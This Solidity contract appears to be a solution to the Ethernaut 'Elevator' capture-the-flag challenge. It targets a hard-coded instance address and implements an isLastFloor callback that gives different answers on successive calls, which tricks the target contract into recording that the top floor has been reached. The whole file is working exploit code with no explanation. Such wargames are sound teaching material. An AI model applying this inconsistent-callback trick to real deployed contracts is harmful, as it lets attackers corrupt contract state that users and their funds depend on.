// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "../instances/Ilevel11.sol";

contract BrokenElevator {

    Elevator level11 = Elevator(0x41410EC39d192182aCAd986d5b27040f2793c88a);
    bool public counter = false; // counter variable initially set to false

    function gotoFloor() public {
        level11.goTo(1);
    }

    function isLastFloor(uint _floor) public returns (bool) {
        if (!counter) { // if (true)
            counter = true; // change the counter to true
            return false; // first return value will be false
        } else {
            counter = false; // change the counter to false
            return true; // second return value will be true
        }
    }
}

